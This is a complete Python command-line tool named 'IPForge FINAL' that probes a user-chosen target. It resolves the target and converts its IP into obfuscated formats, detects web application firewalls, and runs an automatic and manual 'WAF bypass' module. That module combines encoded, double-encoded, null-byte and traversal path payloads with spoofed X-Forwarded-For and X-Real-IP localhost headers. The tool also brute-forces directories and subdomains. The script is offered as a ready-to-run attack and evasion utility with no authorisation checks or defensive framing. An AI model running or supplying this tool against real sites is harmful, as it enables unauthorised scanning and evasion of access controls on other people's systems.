#!/usr/bin/env python3

import asyncio
import socket
import struct
import ssl
import aiohttp

MAX_CONCURRENT = 20

# ---------------------------
# INPUT DETECTION
# ---------------------------

def detect_type(inp):
    try:
        socket.inet_aton(inp)
        return "ip"
    except:
        pass
    if inp.isdigit():
        return "dword"
    elif inp.startswith("0x"):
        return "hex"
    elif any(c.isalpha() for c in inp):
        return "url"
    return "unknown"

def normalize_to_ip(inp, t):
    try:
        if t == "ip":
            return inp
        elif t == "url":
            return socket.gethostbyname(inp)
        elif t == "dword":
            return socket.inet_ntoa(struct.pack("!I", int(inp)))
        elif t == "hex":
            return socket.inet_ntoa(struct.pack("!I", int(inp, 16)))
    except:
        return None

# ---------------------------
# FORMAT CONVERSION
# ---------------------------
def convert_formats(ip):
    return {
        "IP": ip,
        "DWORD": str(struct.unpack("!I", socket.inet_aton(ip))[0]),
        "HEX": "0x" + ''.join([hex(int(x))[2:].zfill(2) for x in ip.split('.')]),
        "OCTAL": '.'.join([format(int(x), '04o') for x in ip.split('.')]),
        "MIXED": f"{hex(int(ip.split('.')[0]))}.{ip.split('.')[1]}.{format(int(ip.split('.')[2]), 'o')}.{ip.split('.')[3]}"
    }

# ---------------------------
# STATUS EXPLANATION
# ---------------------------
def explain_status(code):
    return {
        200: "OK → Accessible",
        301: "Redirect",
        302: "Redirect",
        403: "Blocked → WAF/CDN",
        404: "Not Found → Endpoint missing or filtered",
        429: "Rate Limited → WAF",
        500: "Server Error",
        503: "Blocked → Possible WAF"
    }.get(code, "Unknown")

# ---------------------------
# FETCH
# ---------------------------
async def fetch(session, url, headers, sem):
    async with sem:
        try:
            async with session.get(url, headers=headers) as resp:
                text = await resp.text()
                return resp.status, len(text)
        except:
            return None, 0

# ---------------------------
# WAF BEHAVIOR
# ---------------------------
async def waf_behavior(session, ip, target, sem):
    tests = ["/", "/admin", "/../../", "/%2e/"]
    responses = []

    for t in tests:
        status, _ = await fetch(session, f"http://{ip}{t}", {"Host": target}, sem)
        if status:
            responses.append(status)

    if len(set(responses)) > 2:
        return "Possible WAF (Behavioral)"
    if any(x in [403,429,503] for x in responses):
        return "WAF Blocking Detected"
    return "No Strong WAF Detected"

# ---------------------------
# WEB RECON
# ---------------------------
async def web_recon(ip, target):

    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async with aiohttp.ClientSession() as session:

        print("\n🌐 Recon:\n")

        for proto in ["http", "https"]:
            status, length = await fetch(session, f"{proto}://{ip}", {"Host": target}, sem)
            waf = await waf_behavior(session, ip, target, sem)

            print(f"{proto.upper()} → {status}")
            print(f"Length: {length}")
            print(f"Meaning: {explain_status(status)}")
            print(f"WAF: {waf}\n")

# ---------------------------
# WAF BYPASS
# ---------------------------
payloads = {
    "Normal": "/",
    "Encoded Dot": "/%2e/",
    "Double Encoded": "/%252e/",
    "Traversal": "/../../",
    "Semicolon": "/.;/",
    "Double Slash": "//",
    "Dot Slash": "/./",
    "Encoded Slash": "/%2f/",
    "Null Byte": "/%00/",
    "Trailing Dot": "/."
}

headers_list = {
    "Default": {},
    "X-Forwarded-For": {"X-Forwarded-For": "127.0.0.1"},
    "X-Real-IP": {"X-Real-IP": "127.0.0.1"}
}

async def auto_bypass(ip, target):

    print("\n🚀 Auto Bypass...\n")

    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async with aiohttp.ClientSession() as session:

        base_status, base_len = await fetch(session, f"http://{ip}/", {"Host": target}, sem)
        print(f"Baseline → {base_status} ({explain_status(base_status)})\n")

        for pname, p in payloads.items():
            for hname, h in headers_list.items():

                status, length = await fetch(session, f"http://{ip}{p}", {**h, "Host": target}, sem)

                if status != base_status or abs(length - base_len) > 50:
                    print("🔥 BYPASS FOUND")
                    print(f"Payload : {pname}")
                    print(f"Header  : {hname}")
                    print(f"Status  : {status} → {explain_status(status)}")
                    print("-" * 40)

async def manual_bypass(ip, target):

    sem = asyncio.Semaphore(MAX_CONCURRENT)

    while True:
        print("\n🛡️ Bypass Menu")
        print("[1] Auto Detect")
        print("[2] Manual Test")
        print("[3] Back")

        c = input("Select: ").strip()

        if c == "1":
            await auto_bypass(ip, target)

        elif c == "2":
            for i, k in enumerate(payloads, 1):
                print(f"[{i}] {k}")
            try:
                p = int(input("Payload: ")) - 1
                payload = list(payloads.values())[p]
            except:
                print("❌ Invalid")
                continue

            for i, k in enumerate(headers_list, 1):
                print(f"[{i}] {k}")
            try:
                h = int(input("Header: ")) - 1
                header = list(headers_list.values())[h]
            except:
                print("❌ Invalid")
                continue

            async with aiohttp.ClientSession() as session:
                status, _ = await fetch(session, f"http://{ip}{payload}", {**header, "Host": target}, sem)
                print(f"Status: {status} → {explain_status(status)}")

        elif c == "3":
            return

# ---------------------------
# DEFAULT DATA
# ---------------------------
default_endpoints = ["admin","api","login","dashboard","test","dev","backup","panel","config"]
default_subdomains = ["www","admin","api","dev","test","staging","mail","vpn","portal"]

# ---------------------------
# SCANNERS
# ---------------------------
async def dir_scan(ip, target, words):

    print("\n📂 Endpoint Discovery...\n")

    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async with aiohttp.ClientSession() as session:

        tasks = [fetch(session, f"http://{ip}/{w}", {"Host": target}, sem) for w in words]
        results = await asyncio.gather(*tasks)

        for i, res in enumerate(results):
            status, _ = res
            if status and status not in [404]:
                print(f"/{words[i]} → {status}")

async def sub_scan(target, words):

    print("\n🌐 Subdomain Scan...\n")

    for w in words:
        sub = f"{w}.{target}"
        try:
            ip = socket.gethostbyname(sub)
            print(f"{sub} → {ip}")
        except:
            pass

# ---------------------------
# WORDLIST
# ---------------------------
def load_wordlist():
    path = input("Wordlist path: ").strip()
    try:
        with open(path) as f:
            return [x.strip() for x in f]
    except:
        print("❌ Error loading wordlist")
        return []

# ---------------------------
# MENU
# ---------------------------
def menu():
    print("\n🔥 IPForge FINAL 🔥")
    print("[1] Convert Address Formats")
    print("[2] Web Recon + WAF Detection")
    print("[3] WAF Bypass")
    print("[4] Endpoint Discovery (Default)")
    print("[5] Endpoint Discovery (Custom)")
    print("[6] Subdomain Scan (Default)")
    print("[7] Subdomain Scan (Custom)")
    print("[8] 🔄 Change Target")
    print("[9] Exit")

# ---------------------------
# MAIN
# ---------------------------
async def main():

    while True:

        # 🔥 TARGET LOOP (NEW FIX)
        while True:
            target = input("🎯 Enter target: ").strip()
            t = detect_type(target)

            if t == "unknown":
                print("❌ Invalid input")
                continue

            ip = normalize_to_ip(target, t)
            if not ip:
                print("❌ Resolution failed")
                continue

            print(f"✅ {target} → {ip}")
            break

        # 🔥 MAIN LOOP
        while True:
            menu()
            c = input("Select: ").strip()

            if c == "1":
                for k, v in convert_formats(ip).items():
                    print(f"{k}: {v}")

            elif c == "2":
                await web_recon(ip, target)

            elif c == "3":
                await manual_bypass(ip, target)

            elif c == "4":
                await dir_scan(ip, target, default_endpoints)

            elif c == "5":
                wl = load_wordlist()
                if wl:
                    await dir_scan(ip, target, wl)

            elif c == "6":
                await sub_scan(target, default_subdomains)

            elif c == "7":
                wl = load_wordlist()
                if wl:
                    await sub_scan(target, wl)

            elif c == "8":
                print("🔄 Changing target...\n")
                break  # 🔥 goes back to target input

            elif c == "9":
                return

            else:
                print("❌ Invalid choice")

# ---------------------------
# RUN
# ---------------------------
if __name__ == "__main__":
    asyncio.run(main())
